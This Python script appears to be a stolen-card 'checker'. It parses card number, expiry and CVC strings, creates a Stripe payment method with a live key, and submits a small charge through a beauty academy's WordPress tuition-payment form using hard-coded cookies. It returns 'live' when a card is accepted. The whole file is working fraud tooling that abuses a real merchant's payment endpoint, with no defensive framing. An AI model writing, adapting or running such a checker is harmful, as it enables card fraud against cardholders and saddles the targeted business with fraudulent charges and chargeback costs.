import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51MWmbSICV1I3jxabAyBu86sWMgPP177PcGAwChat4WAc5SPafgMTD1biYFDqZHGUgHirfVUP3k6ypFa2uFzRl7jj00D3nJcKy6'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_gcl_au': '1.1.1367202926.1717785226',
	    '_ga': 'GA1.1.893384611.1717785226',
	    'tk_or': '%22%22',
	    'tk_r3d': '%22%22',
	    'tk_lr': '%22%22',
	    '__stripe_mid': '3a0199b6-5c49-4a71-902d-5f067e943a8e8b6c91',
	    'lp_session_guest': 'g-6667f5cca6926',
	    'twk_idm_key': 'xdzosJCoUNJs2yO4wkzym',
	    '__stripe_sid': '7640bd74-93e1-4970-9509-07359c7280685d8ce8',
	    'TawkConnectionTime': '0',
	    '_ga_1MRCZYKWF0': 'GS1.1.1718151395.11.1.1718151493.0.0.0',
	    '_ga_05M43KE6K7': 'GS1.1.1718151396.27.1.1718151493.0.0.0',
	}
	
	headers = {
	    'authority': '5tbeautyacademy.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_gcl_au=1.1.1367202926.1717785226; _ga=GA1.1.893384611.1717785226; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; __stripe_mid=3a0199b6-5c49-4a71-902d-5f067e943a8e8b6c91; lp_session_guest=g-6667f5cca6926; twk_idm_key=xdzosJCoUNJs2yO4wkzym; __stripe_sid=7640bd74-93e1-4970-9509-07359c7280685d8ce8; TawkConnectionTime=0; _ga_1MRCZYKWF0=GS1.1.1718151395.11.1.1718151493.0.0.0; _ga_05M43KE6K7=GS1.1.1718151396.27.1.1718151493.0.0.0',
	    'origin': 'https://5tbeautyacademy.org',
	    'referer': 'https://5tbeautyacademy.org/tuition-payment/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1718151494840',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=19507&_fluentform_6_fluentformnonce=a53ae97c37&_wp_http_referer=%2Ftuition-payment%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=gloosmoke%40gmail.com&input_text=NY&custom-payment-amount=5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '6',
	}
	
	r2 = requests.post(
	    'https://5tbeautyacademy.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text=(r2.text)
	import re
	pattern = r"Status code \d+: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Thank you for your message.' in text:
			return 'live'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print(text)
			return 'risk_threshold'
	
